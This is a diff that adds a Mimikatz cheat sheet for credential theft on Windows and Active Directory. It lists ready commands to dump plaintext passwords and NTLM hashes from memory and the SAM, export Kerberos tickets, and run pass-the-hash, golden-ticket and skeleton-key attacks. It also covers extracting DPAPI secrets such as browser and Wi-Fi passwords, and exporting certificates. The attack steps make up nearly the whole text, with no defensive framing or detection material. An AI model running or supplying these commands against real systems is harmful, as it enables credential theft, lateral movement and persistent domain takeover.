@@ -1,0 +1,72 @@
+Download and Run Mimikatz
+Obtain Mimikatz from its official GitHub repository: https://github.com/gentilkiwi/mimikatz
+Launch a Command Prompt (cmd.exe) or PowerShell with Administrator privileges.
+Navigate to the folder containing mimikatz.exe.
+Run Mimikatz:
+
+cmd
+mimikatz.exe
+--------------------------------------------------------------
+2. Enable Debug Privilege
+Before running certain commands, enable debug privileges:
+privilege::debug
+---------------------------------------------------------------
+
+3. Extract Plaintext Passwords (Live Memory)
+To extract plaintext passwords from memory (if available):
+sekurlsa::logonpasswords
+This command outputs credentials of users currently logged in, including:
+Username
+Domain
+NTLM hash
+Password (if present)
+----------------------------------------------------------------------------
+
+4. Dump Password Hashes
+To extract NTLM hashes for offline cracking:
+lsadump::sam
+This requires SYSTEM privileges and dumps hashes from the Security Account Manager (SAM).
+-------------------------------------------------------------------------------------------
+5. Dump Kerberos Tickets
+To list Kerberos tickets of logged-in users:
+sekurlsa::tickets
+To export tickets for later use (e.g., for pass-the-ticket attacks):
+sekurlsa::tickets /export
+-----------------------------------------------------------------------------------------------
+
+6. Pass-the-Hash Attack
+Authenticate to a target system using an NTLM hash without knowing the plaintext password:
+
+sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<ntlm_hash> /run:<program>
+Example:
+sekurlsa::pth /user:Admin /domain:example.local /ntlm:d41d8cd98f00b204e9800998ecf8427e /run:powershell.exe
+-----------------------------------------------------------------------------------------------------------
+
+7. Golden Ticket Attack
+Create a Kerberos Golden Ticket for persistence in Active Directory:
+
+kerberos::golden /user:<username> /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /id:<user_id>
+Example:
+kerberos::golden /user:Administrator /domain:example.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:aa2b7a1c156c9f2e1d8c8f8c12345678 /id:500
+Inject the ticket into your session:
+kerberos::ptt <path_to_ticket.kirbi>
+--------------------------------------------------
+
+8. Skeleton Key Attack
+Install a universal password across domain controllers:
+privilege::debug
+misc::skeleton
+This allows using a hardcoded password (mimikatz) for any account.
+----------------------------------------------------------------------
+
+9. Extract DPAPI Secrets
+To extract encrypted data such as browser passwords or Wi-Fi keys:
+dpapi::cred /in:"<path_to_credential_file>"
+dpapi::wifi /in:"<path_to_wifi_profile>"
+----------------------------------------------------------------------
+
+10. Export Certificates
+To extract certificates from the local machine for exploitation:
+
+crypto::certificates /export
+-----------------------------------------------------------------------
